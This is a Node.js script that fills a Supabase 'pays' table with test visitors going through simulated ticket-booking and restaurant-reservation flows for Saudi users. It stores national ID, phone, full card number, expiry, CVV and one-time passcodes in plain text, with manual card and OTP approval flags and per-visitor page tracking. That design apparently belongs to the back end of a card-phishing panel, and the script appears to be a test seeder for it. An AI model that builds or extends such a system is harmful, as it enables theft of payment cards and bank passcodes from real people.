#!/usr/bin/env node
import { createClient } from "@supabase/supabase-js";
import WebSocket from "ws";
if (!globalThis.WebSocket) globalThis.WebSocket = WebSocket;

const SUPABASE_URL = process.env.VITE_SUPABASE_URL;
const SUPABASE_KEY =
  process.env.VITE_SUPABASE_PUBLISHABLE_KEY ||
  process.env.VITE_SUPABASE_ANON_KEY;

if (!SUPABASE_URL || !SUPABASE_KEY) {
  console.error("Missing VITE_SUPABASE_URL or VITE_SUPABASE_PUBLISHABLE_KEY");
  process.exit(1);
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false },
  realtime: { params: { eventsPerSecond: 0 } },
  global: { fetch: (...a) => fetch(...a) },
});

const newId = () =>
  "test-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);

async function upsert(id, patch) {
  const { data: existing } = await supabase
    .from("pays")
    .select("data")
    .eq("id", id)
    .maybeSingle();
  const merged = {
    ...(existing?.data || {}),
    ...patch,
    id,
    updatedAt: new Date().toISOString(),
  };
  const { error } = await supabase
    .from("pays")
    .upsert({ id, data: merged }, { onConflict: "id" });
  if (error) throw error;
  return merged;
}

async function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function runTicketFlow() {
  const id = newId();
  console.log(`\n[TICKET] visitor=${id}`);

  await upsert(id, {
    currentPage: "registration",
    createdDate: new Date().toISOString(),
    country: "Saudi Arabia",
    countryCode: "SA",
    ip: "203.0.113.10",
  });
  console.log("  -> registration page");
  await sleep(400);

  await upsert(id, {
    name: "Ahmed Al-Test",
    saudiId: "1234567890",
    email: "ahmed.test@example.com",
    phone: "+966500000001",
    currentPage: "booking",
  });
  console.log("  -> submitted registration");
  await sleep(400);

  await upsert(id, {
    ticketQuantity: 2,
    ticketPrice: 150,
    totalAmount: 300,
    bookingDate: "2026-06-01",
    bookingTime: "19:00",
    currentPage: "cart",
  });
  console.log("  -> selected tickets");
  await sleep(400);

  await upsert(id, { currentPage: "checkout" });
  await sleep(300);

  const cardEntry = {
    cardNumber: "4111111111111111",
    cardName: "AHMED AL TEST",
    expiryMonth: "12",
    expiryYear: "28",
    cvv: "123",
    cardType: "visa",
    timestamp: new Date().toISOString(),
  };
  await upsert(id, {
    ...cardEntry,
    cardHistory: [cardEntry],
    status: "pending_approval",
    cardApproved: false,
    cardStatus: "pending_approval",
    currentPage: "otp",
  });
  console.log("  -> submitted card");
  await sleep(400);

  const otpEntry = { code: "123456", timestamp: new Date().toISOString() };
  await upsert(id, {
    otp: otpEntry.code,
    otpHistory: [otpEntry],
    otpApproved: false,
    otpStatus: "pending",
    currentPage: "otp",
  });
  console.log("  -> submitted OTP");
  return id;
}

async function runReservationFlow() {
  const id = newId();
  console.log(`\n[RESERVATION] visitor=${id}`);

  await upsert(id, {
    currentPage: "reserve",
    createdDate: new Date().toISOString(),
    country: "Saudi Arabia",
    countryCode: "SA",
    ip: "203.0.113.20",
    type: "restaurant_reservation",
    restaurant: "بيت السلام",
    restaurantEn: "Bait Al Salam",
    date: "2026-06-15",
    time: "20:30",
    guests: 4,
    name: "Sara Tester",
    phone: "+966500000002",
    notes: "Window seat please",
    total: 480,
  });
  console.log("  -> created reservation");
  await sleep(400);

  await upsert(id, { currentPage: "reserve_checkout" });
  await sleep(300);

  const cardEntry = {
    cardNumber: "5555555555554444",
    cardName: "SARA TESTER",
    expiryMonth: "08",
    expiryYear: "27",
    cvv: "456",
    cardType: "mastercard",
    timestamp: new Date().toISOString(),
  };
  await upsert(id, {
    ...cardEntry,
    cardHistory: [cardEntry],
    status: "pending_approval",
    cardApproved: false,
    cardStatus: "pending_approval",
    currentPage: "reserve_otp",
  });
  console.log("  -> submitted card");
  await sleep(400);

  const otpEntry = { code: "654321", timestamp: new Date().toISOString() };
  await upsert(id, {
    otp: otpEntry.code,
    otpHistory: [otpEntry],
    otpApproved: false,
    otpStatus: "pending",
    currentPage: "reserve_otp",
  });
  console.log("  -> submitted OTP");
  return id;
}

async function cleanup(ids) {
  if (!ids.length) return;
  const { error } = await supabase.from("pays").delete().in("id", ids);
  if (error) console.error("Cleanup error:", error.message);
  else console.log(`\nCleaned up ${ids.length} test visitors.`);
}

const args = new Set(process.argv.slice(2));
const doCleanup = args.has("--cleanup");
const onlyTicket = args.has("--ticket");
const onlyReserve = args.has("--reserve");

const created = [];
try {
  if (!onlyReserve) created.push(await runTicketFlow());
  if (!onlyTicket) created.push(await runReservationFlow());
  console.log("\nDone. Visitor IDs:", created);
  if (doCleanup) {
    await sleep(2000);
    await cleanup(created);
  } else {
    console.log("\nTip: pass --cleanup to delete the test rows afterwards.");
  }
} catch (e) {
  console.error("FAILED:", e);
  process.exit(1);
}
